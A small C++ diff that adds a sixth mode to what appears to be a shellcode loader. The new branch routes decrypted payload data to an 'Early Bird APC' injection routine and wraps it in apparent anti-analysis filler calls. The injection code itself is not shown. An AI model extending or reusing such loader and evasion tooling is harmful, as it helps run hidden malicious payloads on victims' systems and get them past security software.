@@ -137,6 +137,11 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
         this->printMode("Function 5");
         this->startBase(MasterEncoderForDynamicLoadPlus::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
+    }else if (function_mode == "6") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 6");
+        this->startBase( MasterEncoderForEarlyBirdAPC_InjetcLoad::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
     }else {
         std::cout << "Invalid function mode!" << std::endl;
         return;
